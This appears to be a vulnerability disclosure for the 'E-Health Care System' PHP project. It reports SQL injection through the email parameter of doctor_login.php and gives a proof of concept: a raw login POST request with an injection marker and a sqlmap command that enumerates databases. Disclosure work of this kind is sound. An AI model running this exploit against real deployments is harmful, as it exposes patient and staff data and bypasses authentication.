## E-Health Care System has SQL injection vulnerability via doctor_login.php

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
/Doctor/doctor_login.php
## describe
An unrestricted SQL injection attack exists in the  E-Health Care System. The parameters that can be controlled are as follows: email in doctor_login.php.  This function executes the email  parameter into the SQL statement without any restrictions.  A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database. Or bypass the login function by sql injection.
## code analysis
The email parameter in Doctor/doctor_login.php  is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

![image-20241106154538422](https://github.com/user-attachments/assets/f7813e35-e9c8-40ad-bcd8-b8cdc407f51d)


POC

```
POST /Doctor/doctor_login.php HTTP/1.1
Host: healthcaresystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://healthcaresystem
Connection: close
Referer: http://healthcaresystem/Doctor/doctor_login.php
Cookie: PHPSESSID=k4kqb2fb6qsevrcvac0th97st0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=1*&pswd=1234&submit=login
```

sava as 1.txt

excute the command.

```
python sqlmap.py -r 1.txt --dbs
```

![image-20241106155557395](https://github.com/user-attachments/assets/c8f88a57-9887-4323-b3f3-1d7c1bf8541f)

Get database_names

![image-20241106155805823](https://github.com/user-attachments/assets/36ec78f9-545e-4346-a67b-22ece85b0682)










